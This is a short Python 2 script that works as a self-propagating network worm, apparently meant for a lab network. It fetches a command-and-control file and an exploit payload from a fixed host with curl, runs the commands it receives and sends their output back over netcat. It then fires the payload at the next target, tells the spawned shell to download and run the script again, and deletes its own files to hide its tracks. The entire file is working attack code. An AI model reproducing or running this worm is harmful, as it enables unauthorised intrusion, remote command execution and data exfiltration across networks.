#!/usr/bin/env python2
import time
import sys
import os
import subprocess as sp
import json

target = 0
if len(sys.argv) > 1:
	target = int(sys.argv[1])

# check for previous infection
if os.path.exists('/tmp/barglefish.notaworm'):
	try:
		os.remove('/tmp/dustbuster.py')
	except:
		pass
	sys.exit(1)

# place marker before working
with open('/tmp/barglefish.notaworm', 'w') as marker:
	marker.write('nothing here...')

# download CC file and payload
sp.call(['curl', 'http://192.168.100.145/WORMS/cc.txt',  '-o', '/tmp/cc.notaworm'])
sp.call(['curl', 'http://192.168.100.145/WORMS/ppacket', '-o', '/tmp/poison.notaworm'])

cc, poison = None, None
with open('/tmp/cc.notaworm') as cc_file:
	cc = cc_file.readlines()

with open('/tmp/poison.notaworm') as poison_file:
	poison = poison_file.read()

# parse CC file
cc = filter(bool, map(lambda s: s.rstrip('\n'), cc))
targets = cc[cc.index('[targets]')+1:cc.index('[cmds]')]
cmds = cc[cc.index('[cmds]')+1:]

# run commands and report results
cmd_results = {}
for cmd in cmds:
	c_proc = sp.Popen(cmd.split(' '), stdout=sp.PIPE)
	cmd_results[cmd] = c_proc.stdout.read()

nc = sp.Popen(['nc', '192.168.100.145', '6969'], stdin=sp.PIPE)
try:
	nc.stdin.write(json.dumps(cmd_results))
	nc.stdin.flush()
except:
	pass

# run payload packet through netcat, then wait a little for it to be processed
target_ip = targets[target]
nc = sp.Popen(['nc', target_ip, '77'], stdin=sp.PIPE, stdout=sp.PIPE)
nc.stdin.write(poison)
nc.stdin.flush()
time.sleep(1)

# tell spawned shell to download the python script and run it
nc.stdin.write('curl http://192.168.100.145/WORMS/dustbuster.py > /tmp/dustbuster.py && python2 /tmp/dustbuster.py {} &\ndisown\n'.format(target+1))
nc.stdin.flush()

# erase itself
os.remove('/tmp/dustbuster.py')
os.remove('/tmp/cc.notaworm')
os.remove('/tmp/poison.notaworm')
